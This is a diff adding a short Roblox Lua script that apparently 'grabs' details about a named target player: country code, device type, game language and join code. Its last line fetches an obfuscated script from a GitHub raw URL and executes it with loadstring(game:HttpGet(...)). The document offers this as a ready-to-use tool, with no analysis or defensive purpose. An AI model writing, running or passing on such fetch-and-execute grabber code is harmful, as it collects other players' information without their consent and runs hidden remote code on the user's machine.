@@ -1,0 +1,14 @@
+Target = "NameHere" -- Your Target's name (auto completes)
+
+settings = {
+    --[[
+        true = Yes
+        false = No
+    ]]
+     CountryCode = true, -- If you want it to print their their country code (for example: USA = United States of America)
+     DeviceType = true, -- If you want it to print their device type (aka PC, Mobile, Console, Tablet, etc)
+     RobloxLanguage = true, -- If you want it to print the language their roblox is set to
+     JoinCode = true, -- If you want it to print their Join code (used to join people in that shit game)
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bukito20/Public-scripts/main/Grabber%20obfu%20islands.lua"))()
